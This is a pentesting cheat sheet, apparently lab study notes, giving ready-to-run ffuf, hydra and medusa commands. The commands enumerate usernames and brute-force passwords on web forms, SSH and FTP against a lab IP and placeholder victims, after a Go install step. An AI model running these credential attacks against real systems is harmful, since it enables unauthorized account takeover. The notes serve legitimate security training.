# `ffuf`

- https://github.com/ffuf/ffuf

## Go update

```bash
# Remove the golang-go package
sudo apt-get remove golang-go

# Remove the golang-go dependencies
sudo apt-get remove --auto-remove golang-go

# Uninstall the existing Go package
sudo rm -rvf /usr/local/go

# Install the new Go version
wget https://dl.google.com/go/go1.14.linux-amd64.tar.gz

# Extract the archive file
sudo tar -xvf go1.14.linux-amd64.tar.gz

sudo mv go /usr/local

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# Reload environment variables
source ~/.profile

# Verify Go version
go version
```

### Usage

#### Usernames enumeration

```bash
ffuf -w /usr/share/wordlists/usernames.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.33/customers/signup -mr "username already exists"
```

#### Brute force Passwords

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/best.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.33/customers/login -fc 200
```

# `hydra`

## Installation

```bash
# usually installed by default on kali/parrot
apt install hydra
```

## Args

```bash
-l <user> # specifies the user
-P <path_passwd> # takes a path to a file which contains a list of password
-t <int> # specifies the number of threads used during the attack
-f # exit when a login/pass pair is found (-M: -f per host, -F global)
-s <PORT> # specifies service port
-V # verbose 
```

## Usage

### SSH

```bash
hydra -l <user_name> -P <wordlist>.txt ssh://<ip_victim>
```

### FTP

```bash
hydra -l user -P <wordlist>.txt ftp://<ip_victim>
```

### WEB POST

```bash
hydra -l <username> -P <wordlist> <ip_victim> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

# `medusa`

## Brute force SSH

```bash
medusa -h IP -U users.txt -P passwords.txt -M ssh IP
```

